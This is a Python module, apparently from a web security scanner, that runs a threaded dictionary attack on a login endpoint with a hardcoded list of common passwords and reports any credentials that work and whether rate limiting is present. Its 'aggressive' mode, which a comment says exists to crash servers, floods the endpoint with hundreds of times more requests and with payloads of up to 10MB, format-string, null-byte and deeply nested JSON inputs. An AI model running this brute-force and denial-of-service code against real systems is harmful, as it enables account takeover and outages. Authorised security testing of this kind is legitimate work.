from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Real Dictionary Attack / Rate Limit Check.
    """
    username = scenario.config.get("user", "admin")
    
    # 1. Real Common Passwords
    # 1. Real Common Passwords
    passwords = [
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "111111", "1234567", "dragon", "admin",
        "welcome", "orange", "password123", "letmein", "monkey",
        "system", "login", "changeme", "sunshine", "princess",
        "charlie", "123123", "1234", "root", "pass", "football", 
        "computer", "george", "1234567890", "master", "shadow", 
        "superman", "jessica", "daniel", "solo", "bebe", "trust", 
        "amanda", "chicken", "hello", "barbie", "trinity", "ashley", 
        "nicole", "secure", "google", "hacker", "freedom", "cookie",
        "database", "pookie", "scout", "ninja", "masterkey",
        "starwars", "pokemon", "williams", "jordan", "killer",
        "bailey", "misty", "simon", "fucker", "fuckyou",
        "000000", "1111", "1212", "7777777", "696969",
        "qazwsx", "zxcvbn", "guest", "user", "manager",
        "sysadmin", "support", "service", "oracle", "apache",
        "tomcat", "postgres", "mysql", "java", "server",
        "abc12345", "test1234", "password01", "admin123", "secret",
        "god", "jesus", "love", "angel", "beautiful", "princess",
        "michael", "jordan", "football", "baseball", "soccer",
        "access", "admin1", "administrator", "password2023", "password2024",
        "changeme1", "changeme123", "welcome1", "welcome123",
        "test01", "test02", "demo", "demo123", "operator",
        "summer", "winter", "autumn", "spring", "march",
        "april", "may", "june", "july", "august",
        "september", "october", "november", "december",
        "monday", "tuesday", "wednesday", "thursday", "friday",
        "123qwe", "qwe123", "pass1234", "pass1", "a", "aa",
        "111", "222", "333", "444", "555", "666", "777", "888", "999"
    ]
    
    # 2. Server Crash Payloads (Buffer Overflow / DoS) - User Request
    if scenario.config.get("aggressive"):
        print("    [!!!] UNLEASHING EXTREME Brute Force & Buffer Overflow Payloads...")
        # Expand common passwords list significantly for aggressive mode
        passwords.extend([
            "admin", "password", "123456", "admin123", "root", "toor", "user", "guest",
            "qwerty", "password123", "12345678", "111111", "12345", "oracle", "mysql",
            "postgres", "service", "support", "manager", "sysadmin", "login", "secret"
        ] * 300) # Duplicate to increase volume (User Demand: K's of attacks)

        # EXTREME BUFFER OVERFLOWS (Attempting to crash the parser)
        passwords.extend([
            "A" * 10000,    # 10KB
            "B" * 50000,    # 50KB
            "C" * 100000,   # 100KB
            "D" * 500000,   # 500KB
            "E" * 1000000,  # 1MB
            "F" * 10000000, # 10MB (The "Parser execution" killer)
            "'" * 1000,     # SQL Stress
            "%s" * 1000,    # Format String
            "\x00" * 1000,  # Null Byte
            "\n" * 1000,    # Newline
            "{'a':" * 500 + "1" + "}" * 500 # Nested JSON Depth Attack
        ])
    
    count = len(passwords)
    
    # Pre-check
    check = client.send(scenario.method, scenario.target, json_body={"u": "test", "p": "test"})
    if check.status_code in [404, 405]:
         return {
            "scenario_id": scenario.id,
            "attack_type": "brute_force",
            "passed": True,
            "skipped": True,
            "details": f"Endpoint {scenario.target} returned {check.status_code}. Path does not exist/accept requests. Skipping brute force."
        }

    responses = []
    success_creds = []
    
    import concurrent.futures
    import threading
    lock = threading.Lock()
    
    def check_password(pwd):
        try:
            body = {"username": username, "password": pwd}
            resp = client.send(scenario.method, scenario.target, json_body=body)
            
            if resp.status_code != 0:
                with lock: responses.append(resp.status_code)
                
                # REFINED SUCCESS DETECTION
                is_success = False
                lower_text = resp.text.lower()
                
                if resp.status_code == 200:
                    keywords = ["token", "success", "session", "auth", "profile", "user_id"]
                    if any(k in lower_text for k in keywords):
                        is_success = True
                elif resp.status_code in [302, 301]:
                     loc = resp.headers.get("Location", "").lower()
                     if "login" not in loc and "auth" not in loc:
                          is_success = True
                
                if is_success:
                    with lock: success_creds.append(pwd)
        except Exception:
            pass
                 
    # HIGH PRESSURE THREADS
    max_workers = 100 if scenario.config.get("aggressive") else 20
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            list(executor.map(check_password, passwords))
    except Exception as e:
        print(f"    [!] Brute Force Engine Error: {e}")

    if success_creds:
         return {
            "scenario_id": scenario.id,
            "attack_type": "brute_force",
            "passed": False,
            "details": f"[CRITICAL] Weak Credentials Found! User: {username}, Passwords: {', '.join(success_creds)}"
        }

    # Rate Limiting Check
    rate_limited = 429 in responses or 403 in responses
    
    details = f"Sent {count} request with common passwords. No Rate Limit detected."
    passed = False # Default fail if no protection
    
    if rate_limited:
        details = "Rate Limiting Protection Active (429/403 Detected)."
        passed = True
    elif all(r == 401 for r in responses):
        # Good, at least it denied access, but did it slow down?
        # For now, if no 429, we flag as potential issue
        details = "No Rate Limit detected (All 401s)."
        passed = False
    elif all(r == 200 for r in responses):
        return {
            "scenario_id": scenario.id,
            "attack_type": "brute_force",
            "status": "INCONCLUSIVE", # New field for Engine to read if passed/skipped logic is bypassed or adapted
            "passed": True, # Keep passed=True to avoid "VULNERABLE" default fallback in engine if it relies on it, but engine uses CheckResult mapping now.
            # actually engine.py maps dict -> CheckResult. We need to return the dict such that engine converts it to INCONCLUSIVE.
            # Engine logic: if res_dict.get("skipped"): status="SECURE". 
            # We need to update engine.py to handle "status" in dict explicitly if present.
            "details": "Endpoint always returns 200 OK. Cannot determine success (Blind)."
        }
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "brute_force",
        "passed": passed,
        "details": details
    }
